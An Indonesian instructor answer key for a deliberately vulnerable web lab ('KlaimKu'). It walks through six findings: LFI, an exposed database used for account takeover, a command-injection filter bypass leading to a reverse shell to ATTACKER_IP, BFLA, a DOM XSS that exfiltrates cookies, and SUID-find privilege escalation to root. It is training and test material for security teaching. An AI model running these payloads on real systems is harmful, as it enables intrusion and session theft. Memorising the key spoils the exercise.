# Kunci Jawaban Instruktur - Lab KlaimKu

> **Dokumen ini TIDAK ikut di-COPY ke image Docker.** Hanya untuk instruktur/penilai.

Total temuan yang harus dilaporkan peserta: **6** (5 kerentanan web + 1 privilege
escalation level container). Rantai wajib menuju shell melibatkan **3** kerentanan
berurutan (LFI -> DB terekspos/account takeover -> Command Injection), mirip pola
Lab 1 (IDOR -> SQLi -> Command Injection) tapi dengan kelas kerentanan yang sama
sekali berbeda. BFLA dan DOM-based XSS berdiri sendiri, tidak perlu shell.

---

## 1. Local File Inclusion (Information Disclosure) - `debug_viewer.php`

**Lokasi bug:** `app/www/debug_viewer.php`

```php
$path = $_GET['path'] ?? '';
include $path;
```

Tidak ada validasi/filter apa pun, dan tidak ada pengecekan sesi/login sama sekali
- berbeda dari pola bypass filter di Lab 1 (SQLi), di sini justru **tidak ada
filter sama sekali** untuk dilewati. Endpoint ini tidak tertaut di navigasi mana
pun, hanya disebut di `robots.txt` (`Disallow: /debug_viewer.php`), sama seperti
pola recon `/staff-x7k2/` di Lab 1.

**Langkah 1 - konfirmasi LFI murni (quick win):**
```
GET /debug_viewer.php?path=/etc/passwd
```
Karena tidak ada filter, traversal `../` pun sebetulnya tidak diperlukan untuk path
absolut - langsung mengembalikan isi `/etc/passwd`.

**Langkah 2 - baca file konfigurasi lama di luar docroot:**
```
GET /debug_viewer.php?path=/var/www/.env
```
Mengembalikan:
```
DB_HOST=db
DB_NAME=klaimku
DB_USER=klaimku_app
DB_PASS=klaimku_app_pw
```
File ini sengaja diletakkan di `/var/www/.env` (satu level di luar docroot
`/var/www/html/`) sehingga `GET /.env` langsung lewat HTTP tetap 404 - LFI di
`debug_viewer.php` yang tidak dibatasi ke docroot inilah satu-satunya jalan untuk
membacanya. `DB_HOST=db` adalah hostname internal Docker (tidak berguna diakses
langsung dari luar), tapi `DB_USER`/`DB_PASS`/`DB_NAME` tetap valid untuk connect
ke port MySQL yang ternyata dipublikasikan (lihat temuan #2).

Di titik ini, LFI **belum** menghasilkan RCE - murni pembocoran informasi
(kredensial). Ini disengaja supaya LFI sebagai kelas kerentanan tetap sederhana
untuk pemula (baca file sensitif), dengan dampak lanjutan yang datang dari
kerentanan lain di temuan berikutnya, bukan dari LFI itu sendiri.

---

## 2. Security Misconfiguration - Port Database Terekspos + Account Takeover

**Lokasi bug:** `docker-compose.yml`, service `db`:
```yaml
ports:
  - "3306:3306"
```
Berbeda dari Lab 1 & 2 (MySQL tidak pernah diekspos), di lab ini port MySQL
**sengaja dipublikasikan** ke host. Digabung dengan kredensial dari temuan #1,
port yang terbuka ini bisa langsung diakses tanpa lewat aplikasi web sama sekali.

**Langkah 1 - connect ke database pakai kredensial yang bocor:**
```bash
mysql -h 127.0.0.1 -P 3306 -u klaimku_app -pklaimku_app_pw klaimku
```

**Langkah 2 - lihat daftar akun, temukan role yang tidak diberikan ke peserta:**
```sql
SELECT id, username, role FROM users;
```
```
+----+---------------+----------+
| id | username      | role     |
+----+---------------+----------+
|  1 | budi.santoso  | karyawan |
|  2 | siti.aminah   | karyawan |
|  3 | andi.wijaya   | karyawan |
|  4 | dewi.lestari  | hr       |
+----+---------------+----------+
```
`dewi.lestari` adalah satu-satunya akun `hr` - kredensialnya **tidak** dicatat di
`README.md` (beda dari 3 akun karyawan yang memang diberikan ke peserta).
`password_hash` di kolom yang sama adalah bcrypt - tidak perlu (dan tidak
diharapkan) di-crack, karena `klaimku_app` punya hak `UPDATE` penuh ke tabel ini.

**Langkah 3 - buat bcrypt hash sendiri untuk plaintext yang kita tahu:**
```bash
php -r "echo password_hash('P4ssw0rd!takeover', PASSWORD_BCRYPT);"
```

**Langkah 4 - timpa `password_hash` akun HR lewat koneksi DB langsung:**
```sql
UPDATE users SET password_hash = '$2y$12$<hash_hasil_langkah_3>' WHERE username = 'dewi.lestari';
```

**Langkah 5 - login ke aplikasi sebagai HR pakai plaintext yang kita kontrol:**
```bash
curl -c cookies_hr.txt -d "username=dewi.lestari&password=P4ssw0rd!takeover" \
     http://localhost:8084/login.php -i
```
Login berhasil (HTTP 302 ke `/index.php`), sesi sekarang berperan `hr` - buktikan
dengan `GET /admin/index.php` (harus berhasil, bukan HTTP 403).

**Teknik yang sama dengan Lab 1, jalur yang berbeda total:** sama seperti Lab 1
(login dengan bcrypt hash yang plaintext-nya penyerang sendiri yang tentukan),
tapi di sini dicapai lewat *akses database langsung* (network + credential leak),
bukan lewat SQL Injection di aplikasi.

---

## 3. Command Injection (filter bypass) -> RCE - `admin/verify_rekening.php`

**Lokasi bug:** `app/www/admin/verify_rekening.php` - fitur mandiri "Verifikasi
Rekening" khusus HR (`require_role('hr')`, itulah kenapa account takeover di
temuan #2 jadi prasyarat mutlak - satu akun HR hasil takeover sudah cukup untuk
seluruh langkah di bawah, tidak perlu akun kedua):

```php
$blacklist = [';', '|', '&'];
if (str_replace($blacklist, '', $rekening) !== $rekening) {
    $blocked = true;
} else {
    $output = shell_exec('/opt/scripts/cek-rekening.sh ' . $rekening . ' 2>&1');
}
```

Filter memblokir karakter pemisah command yang **paling umum** (`;`, `|`, `&`)
- cukup untuk membendung payload naif - tapi **lupa memfilter newline (`\n`)
maupun command substitution (backtick `` ` `` atau `$()`)**, yang di shell
punya efek serupa untuk memisahkan atau menyisipkan perintah tambahan. Berbeda
dari command injection Lab 1 (`courier-check.php`, tidak ada filter sama
sekali), di sini filter-nya benar-benar ada dan terlihat masuk akal - peserta
perlu menguji karakter alternatif, bukan cuma menyerah begitu payload standar
diblokir.

**Langkah 1 - login sebagai HR (pakai sesi hasil takeover di temuan #2), buka
`admin/verify_rekening.php`, buktikan payload naif diblokir:**
```bash
curl -c cookies_hr.txt -d "username=dewi.lestari&password=P4ssw0rd!takeover" \
     http://localhost:8084/login.php -i

curl -b cookies_hr.txt --data-urlencode "rekening_bank=127.0.0.1; id" \
     http://localhost:8084/admin/verify_rekening.php
```
Response menampilkan "Nomor rekening mengandung karakter yang tidak diizinkan."
- payload dengan `;`/`|`/`&` memang dirancang untuk gagal di titik ini.

**Langkah 2 - bypass pakai newline (`%0a`) sebagai pemisah perintah:**
```bash
curl -b cookies_hr.txt --data-urlencode "rekening_bank=127.0.0.1
id" http://localhost:8084/admin/verify_rekening.php
```
Command yang benar-benar dijalankan shell:
```
/opt/scripts/cek-rekening.sh 127.0.0.1
id 2>&1
```
Shell memperlakukan newline sama seperti `;` untuk memisahkan command - `id`
dieksekusi terpisah dan outputnya ikut tampil (`uid=33(www-data)
gid=33(www-data)`), padahal filter tidak pernah memblokir karakter newline.

**Bypass alternatif (command substitution, tidak butuh newline sama sekali):**
```bash
curl -b cookies_hr.txt --data-urlencode 'rekening_bank=$(id)' \
     http://localhost:8084/admin/verify_rekening.php
```
Di sini `$(id)` disubstitusi shell **sebelum** dikirim sebagai argumen ke
`cek-rekening.sh`, jadi hasilnya tampil sebagai bagian dari argumen itu sendiri
("Nomor rekening uid=33(www-data)... tidak valid") - tetap membuktikan
eksekusi command, hanya beda cara tampil dibanding bypass newline. Backtick
(`` `id` ``) memberi hasil yang sama.

**Langkah 3 - shell interaktif (diperlukan untuk langkah privesc), pakai
newline + reverse shell:**
```
rekening_bank=127.0.0.1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Uji negatif (harus tetap benar):** akses `admin/verify_rekening.php` sebagai
karyawan biasa (bukan HR) harus dikembalikan HTTP 403 - membuktikan bug ini
memang hanya bisa dicapai lewat role HR, bukan siapa saja yang login.

---

## 4. Broken Function Level Authorization - `admin/approve.php`

**Lokasi bug:** `app/www/admin/approve.php`

```php
require_login();   // hanya cek login, TIDAK ada require_role('hr')
...
$stmt = $mysqli->prepare('UPDATE klaim SET status = ?, approved_by = ? WHERE id = ?');
```

Kontras dengan `admin/index.php` yang memanggil `require_role('hr')` dengan benar.
Endpoint aksi ini dipanggil lewat `fetch()` dari `assets/js/app.js`
(fungsi `approveClaim(id, action)`) - peserta menemukannya lewat membaca source JS
yang dimuat di semua halaman (termasuk halaman karyawan biasa), bukan lewat
`admin/index.php` yang memang terlindungi dengan benar dan tidak bisa diakses
karyawan biasa. **Temuan ini berdiri sendiri - tidak perlu akun HR maupun shell.**

**PoC:** login sebagai karyawan biasa (`budi.santoso` / `Karyawan123!`), lalu approve
klaim miliknya sendiri yang berstatus `pending` (mis. klaim id `2` dari seed data)
tanpa pernah melewati review HR:

```bash
curl -c cookies.txt -d "username=budi.santoso&password=Karyawan123!" \
     http://localhost:8084/login.php -i

curl -b cookies.txt -d "id=2&action=approve" \
     http://localhost:8084/admin/approve.php
```

Response `{"success":true,"status":"approved"}`. Verifikasi lewat
`GET /claim.php?id=2` sebagai `budi.santoso` - status sudah berubah jadi
`Approved` walau tidak pernah ada aksi dari akun HR mana pun.

**Uji negatif (harus gagal):** akses `GET /admin/index.php` sebagai `budi.santoso`
harus dikembalikan HTTP 403 ("Akses ditolak") - membuktikan bug ini spesifik di
endpoint aksi, bukan menyeluruh di semua halaman `/admin/`.

---

## 5. DOM-based Reflected XSS - flash message banner

**Lokasi bug:** `app/www/assets/js/app.js`

```js
var msg = params.get('msg');
var flashEl = document.getElementById('flash');
if (msg && flashEl) {
    flashEl.innerHTML = msg;   // sink DOM klasik, tidak pernah lewat PHP
}
```

Fitur ini dipakai untuk menampilkan notifikasi setelah redirect (mis. setelah login
atau submit klaim, lihat `login.php` dan `submit_klaim.php` yang mengirim
`?msg=<pesan>`). Karena `innerHTML` dipakai (bukan `textContent`), parameter URL apa
pun yang dipasang di `msg` akan dirender sebagai HTML/JS oleh browser korban - bug
ini murni client-side, tidak ada payload yang pernah tersimpan di server maupun
tampak lewat `view-source`. **Temuan ini berdiri sendiri - tidak perlu akun HR
maupun shell.**

**PoC:**
```
http://localhost:8084/index.php?msg=<img src=x onerror="fetch('http://ATTACKER_IP:4444/steal?c='+encodeURIComponent(document.cookie))">
```
Kirim link ini ke staf HR (mis. menyamar sebagai "klaim kamu sudah direview, klik
untuk lihat detail"). Saat HR yang sudah login membuka link tersebut di browser,
payload `onerror` berjalan di konteks halaman `index.php` miliknya, meng-exfiltrate
`document.cookie` (termasuk `PHPSESSID`) ke listener penyerang
(`python3 -m http.server 4444`). `session.cookie_httponly` sengaja dibiarkan
default (Off) supaya PoC pencurian sesi bisa dibuktikan tanpa konfigurasi tambahan
- konsisten dengan Lab 2.

**Catatan kalibrasi:** karena sink-nya ada di JavaScript (bukan PHP), `curl`/`view-source`
saja tidak akan menampakkan efek payload - peserta wajib membuka link ini di browser
sungguhan (atau lewat Burp/DevTools) untuk membuktikan dampaknya, berbeda dari
Stored XSS Lab 2 yang bisa dibuktikan cukup dengan melihat halaman ticket sebagai
staff.

---

## 6. Privilege Escalation www-data -> root - SUID misconfig pada `find`

**Enumerasi (dari shell `www-data` hasil temuan #3, teknik berbeda dari `sudo -l`
di Lab 1 maupun `getcap -r /` di Lab 2):**
```
find / -perm -4000 -type f 2>/dev/null
```
Menampilkan beberapa SUID binary standar Debian (`/usr/bin/su`, `/usr/bin/mount`,
`/usr/bin/passwd`, dst.) **plus satu yang tidak standar**:
```
/usr/bin/find
```
`find` bukan binary yang defaultnya punya bit SUID di Debian - ini dipasang secara
sengaja lewat `docker/web/Dockerfile` (`chmod u+s /usr/bin/find`). Narasi: sysadmin
dulu butuh script maintenance untuk mencari & membersihkan lampiran lama tanpa
memberi akses sudo penuh, sehingga memberi `find` bit SUID langsung sebagai
"solusi cepat" - lupa dicabut setelah script itu tidak lagi dipakai.

**Eksploitasi (teknik GTFOBins standar untuk `find` dengan SUID bit, ironisnya
`find` dipakai untuk mencari dirinya sendiri saat enumerasi):**
```bash
find . -exec /bin/sh -p \; -quit
id
```
```
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
`find` yang punya bit SUID root menjalankan `/bin/sh -p` (flag `-p` mempertahankan
privilege efektif, tidak diturunkan otomatis) sebagai proses anak yang mewarisi
`euid=0` dari binary induknya.

**Bukti keberhasilan (flag):** `/root/flag.txt` (mode `600`, hanya bisa dibaca
root - `www-data` biasa akan dapat `Permission denied` kalau mencoba sebelum
privesc berhasil) berisi:
```
KLAIMKU{suid_find_root_pwn}
```
Sudah langsung ada di `$HOME` root sejak image dibangun (lihat `docker/web/Dockerfile`)
- tidak disembunyikan di path lain dan tidak perlu `find` lagi untuk menemukannya,
cukup dari shell hasil eksploitasi di atas:
```
cat /root/flag.txt
```

**Kenapa ini berbeda dari Lab 1 & 2:** Lab 1 mengeksploitasi *sudo rule* yang salah
konfigurasi (`sudo -l` -> GTFOBins `less`); Lab 2 mengeksploitasi *Linux file
capability* (`getcap -r /` -> GTFOBins `python3`). Lab ini sama sekali tidak
melibatkan `sudo` atau `capabilities` - murni bit **SUID** pada binary biasa,
kelas kerentanan privesc yang berbeda dan enumerasi yang berbeda pula
(`find / -perm -4000` alih-alih `sudo -l` atau `getcap -r /`).

**Batas temuan:** ini adalah root **di dalam container `web`**, bukan root host.
Container tidak berjalan `privileged`, tidak mem-mount Docker socket, dan tidak
memakai `--pid=host`/`--net=host` - tidak ada langkah container escape di lab ini.
Peserta harus melaporkan dampak sesuai batas ini.

---

## Ringkasan Temuan

```
Recon (docker compose, port 8084 & 3306 dipublikasikan eksplisit + robots.txt
   mengungkap /debug_viewer.php dan /admin/)
   -> LFI murni di debug_viewer.php?path=/etc/passwd (quick win, tanpa filter)
   -> LFI baca /var/www/.env -> bocor kredensial database (info disclosure saja)
   -> port MySQL 3306 terbuka -> connect langsung pakai kredensial bocor
   -> SELECT users -> temukan akun HR (dewi.lestari) yang tidak diberi ke peserta
   -> UPDATE password_hash akun HR pakai bcrypt hash buatan sendiri -> account takeover
   -> login sebagai HR -> admin/verify_rekening.php (filter blokir ;|& tapi
      lupa newline/backtick/$()) -> bypass -> RCE -> shell www-data
   -> find / -perm -4000 -> /usr/bin/find punya SUID root (tidak standar)
   -> find . -exec /bin/sh -p \; -quit -> root shell (di dalam container)
   -> cat /root/flag.txt -> KLAIMKU{suid_find_root_pwn}

Berdiri sendiri (tidak perlu akun HR maupun shell):
   -> BFLA di admin/approve.php (self-approve klaim, ditemukan lewat assets/js/app.js)
   -> DOM-based Reflected XSS di flash message banner (?msg= -> innerHTML)
```
